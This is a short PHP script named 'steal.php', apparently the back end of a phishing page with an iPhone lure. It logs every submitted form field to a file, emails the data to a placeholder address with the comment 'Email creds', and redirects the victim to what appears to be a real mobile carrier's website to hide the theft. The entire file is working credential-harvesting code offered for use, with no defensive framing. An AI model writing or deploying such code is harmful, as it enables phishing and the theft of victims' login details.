<?php  // steal.php
$data = json_encode($_POST + $_GET);
file_put_contents('logs.txt', date('Y-m-d H:i:s') . ' | ' . $data . "\n", FILE_APPEND | LOCK_EX);
mail('your@email.com', 'iPhone Hit!', $data);  // Email creds
echo '<script>window.location="https://jazz.com.pk";</script>';  // Redirect clean
?>
